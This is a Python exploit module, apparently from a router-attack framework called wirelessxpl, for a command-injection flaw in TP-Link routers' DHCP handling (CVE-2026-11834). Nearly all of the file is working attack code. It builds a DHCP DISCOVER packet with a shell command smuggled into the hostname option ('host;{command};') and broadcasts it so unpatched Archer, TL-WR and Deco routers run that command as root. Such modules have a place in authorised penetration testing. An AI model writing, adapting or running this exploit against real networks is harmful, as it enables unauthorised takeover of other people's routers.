# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TP-Link DHCP Option Command Injection (CVE-2026-11834).

    Multiple TP-Link routers process DHCP option values (e.g. option 12
    hostname, option 60 vendor class) without sanitization when writing
    them into system configuration. When a DHCP client sends a crafted
    hostname containing shell metacharacters, the router firmware passes
    the value through system() during lease processing, allowing OS
    command injection from any device on the LAN or wireless network.

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TP-Link DHCP Option Command Injection (CVE-2026-11834)",
        "description": (
            "Exploits CVE-2026-11834 via command injection through DHCP "
            "option 12 (hostname). TP-Link router firmware passes DHCP "
            "client hostnames unsanitized to system() during lease "
            "processing. An attacker on the local network sends a DHCP "
            "DISCOVER with a crafted hostname to execute arbitrary "
            "commands on the router."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-11834",
            "https://www.tp-link.com/us/support/download/",
        ),
        "disclosure_date": "2026-03-15",
        "platform": "linux",
        "arch": "mips",
        "privileged": True,
        "targets": (
            "TP-Link Archer series (unpatched firmware)",
            "TP-Link TL-WR series (unpatched firmware)",
            "TP-Link Deco series (unpatched firmware)",
        ),
    }

    target = OptIP("", "Target router IP (or broadcast 255.255.255.255)")
    port = OptPort(67, "DHCP server port")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    command = OptString("id", "OS command to inject via DHCP hostname")
    interface = OptString("", "Network interface to send DHCP from")

    # DHCP constants
    _DHCP_SERVER_PORT = 67
    _DHCP_CLIENT_PORT = 68
    _DHCP_MAGIC_COOKIE = b"\x63\x82\x53\x63"
    _DHCP_DISCOVER = 1
    _OPT_HOSTNAME = 12
    _OPT_MSG_TYPE = 53
    _OPT_VENDOR_CLASS = 60
    _OPT_END = 255

    def _build_dhcp_discover(self) -> bytes:
        """Build a DHCP DISCOVER with injected hostname."""
        xid = struct.pack("!I", 0x12345678)
        # BOOTP header
        packet = b"\x01"  # op: BOOTREQUEST
        packet += b"\x01"  # htype: Ethernet
        packet += b"\x06"  # hlen: 6
        packet += b"\x00"  # hops: 0
        packet += xid
        packet += b"\x00\x00"  # secs
        packet += b"\x80\x00"  # flags: broadcast
        packet += b"\x00" * 4  # ciaddr
        packet += b"\x00" * 4  # yiaddr
        packet += b"\x00" * 4  # siaddr
        packet += b"\x00" * 4  # giaddr
        packet += b"\xaa\xbb\xcc\xdd\xee\xff"  # chaddr (fake MAC)
        packet += b"\x00" * 10  # chaddr padding
        packet += b"\x00" * 64  # sname
        packet += b"\x00" * 128  # file
        packet += self._DHCP_MAGIC_COOKIE

        # Option 53: DHCP Message Type = DISCOVER
        packet += struct.pack("BBB", self._OPT_MSG_TYPE, 1, self._DHCP_DISCOVER)

        # Option 12: Hostname with injected command
        injected_hostname = f"host;{self.command};".encode()
        packet += struct.pack("BB", self._OPT_HOSTNAME, len(injected_hostname))
        packet += injected_hostname

        # Option 60: Vendor class (benign)
        vendor = b"MSFT 5.0"
        packet += struct.pack("BB", self._OPT_VENDOR_CLASS, len(vendor))
        packet += vendor

        # End
        packet += struct.pack("B", self._OPT_END)

        return packet

    def _send_dhcp(self, packet: bytes) -> bool:
        """Send DHCP packet via UDP broadcast."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(self.timeout)
            if self.interface:
                sock.setsockopt(
                    socket.SOL_SOCKET,
                    socket.SO_BINDTODEVICE,
                    self.interface.encode("utf-8"),
                )
            sock.bind(("0.0.0.0", self._DHCP_CLIENT_PORT))
            dest = str(self.target) if self.target else "255.255.255.255"
            sock.sendto(packet, (dest, self._DHCP_SERVER_PORT))
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Check if DHCP server is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.connect((str(self.target) or "255.255.255.255", self._DHCP_SERVER_PORT))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (router IP or 255.255.255.255)")
            return

        print_success("Sending crafted DHCP DISCOVER with injected hostname")
        self._exploit()

    def _exploit(self) -> None:
        packet = self._build_dhcp_discover()

        print_status(
            f"DHCP DISCOVER with hostname injection: "
            f"'host;{self.command};' ({len(packet)} bytes)"
        )

        if self._send_dhcp(packet):
            print_success(
                f"DHCP DISCOVER sent. If the target router processes "
                f"option 12 without sanitization, the command "
                f"'{self.command}' will execute during lease handling."
            )
        else:
            print_error(
                "Failed to send DHCP packet. Ensure you have root "
                "privileges and the interface is correct."
            )
